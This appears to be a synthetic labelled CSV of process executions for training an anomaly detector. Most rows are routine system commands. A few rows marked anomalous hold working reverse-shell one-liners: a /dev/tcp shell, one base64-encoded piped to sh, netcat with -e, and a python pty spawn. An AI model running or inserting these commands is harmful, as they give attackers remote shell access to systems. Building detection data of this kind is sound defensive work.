parent_comm,executed_cmd,is_anomaly
python3,/usr/bin/python3 app.py,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
dockerd,usr/bin/docker ps,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
sh,/bin/sh -c date,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvNDQ0NCAwPiYx | base64 -d | sh,1
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvNDQ0NCAwPiYx | base64 -d | sh,1
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
python3,/usr/bin/python3 app.py,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
python3,/usr/bin/python3 app.py,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -i >& /dev/tcp/10.0.0.5/4444 0>&1,1
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
python3,/usr/bin/python3 app.py,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/cat /etc/hosts,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -i >& /dev/tcp/10.0.0.5/4444 0>&1,1
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,"python3 -c 'import pty; pty.spawn(""/bin/bash"")'",1
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
dockerd,usr/bin/docker ps,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
nginx,/usr/sbin/nginx -g daemon off;,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
sh,/bin/sh -c date,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/ls -la /var/log,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
sh,/usr/bin/nc -e /bin/sh 10.0.0.1 8080,1
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/cat /etc/hosts,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/ls -la /var/log,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
python3,/usr/bin/python3 app.py,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
dockerd,usr/bin/docker ps,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
dockerd,usr/bin/docker ps,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
bash,/usr/bin/cat /etc/hosts,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
sh,/bin/sh -c date,0
dockerd,usr/bin/docker ps,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/ls -la /var/log,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
sh,/bin/sh -c date,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/ls -la /var/log,0
sh,/bin/sh -c date,0
systemd,/usr/lib/systemd/systemd-journald,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
dockerd,usr/bin/docker ps,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/ls -la /var/log,0
nginx,/usr/sbin/nginx -g daemon off;,0
python3,/usr/bin/python3 app.py,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
sh,/bin/sh -c date,0
bash,/usr/bin/ls -la /var/log,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
python3,/usr/bin/python3 app.py,0
sh,/usr/bin/nc -e /bin/sh 10.0.0.1 8080,1
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
nginx,/usr/sbin/nginx -g daemon off;,0
dockerd,usr/bin/docker ps,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
dockerd,usr/bin/docker ps,0
python3,/usr/bin/python3 app.py,0
sh,/bin/sh -c date,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/cat /etc/hosts,0
systemd,/usr/lib/systemd/systemd-journald,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
sh,/bin/sh -c date,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
dockerd,usr/bin/docker ps,0
bash,/usr/bin/cat /etc/hosts,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
python3,/usr/bin/python3 app.py,0
dockerd,usr/bin/docker ps,0
sh,/bin/sh -c date,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
bash,/usr/bin/ls -la /var/log,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
nginx,/usr/sbin/nginx -g daemon off;,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/cat /etc/hosts,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
python3,/usr/bin/python3 app.py,0
bash,/usr/bin/ls -la /var/log,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
nginx,/usr/sbin/nginx -g daemon off;,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
python3,/usr/bin/python3 app.py,0
nginx,/usr/sbin/nginx -g daemon off;,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
python3,/usr/bin/python3 app.py,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
sh,/bin/sh -c date,0
nginx,/usr/sbin/nginx -g daemon off;,0
bash,/usr/bin/grep 'error' /var/log/syslog | wc -l,0
systemd,/usr/lib/systemd/systemd-journald,0
bash,/usr/bin/ls -la /var/log,0
systemd,/usr/lib/systemd/systemd-journald,0
sh,/bin/sh -c date,0
systemd,/usr/lib/systemd/systemd-journald,0
postgres,/usr/lib/postgresql/15/bin/postgres -D /var/lib/postgresql/data,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
cron,/usr/sbin/logrotate /etc/logrotate.conf,0
systemd,/usr/lib/systemd/systemd-journald,0
systemd,/usr/lib/systemd/systemd-journald,0
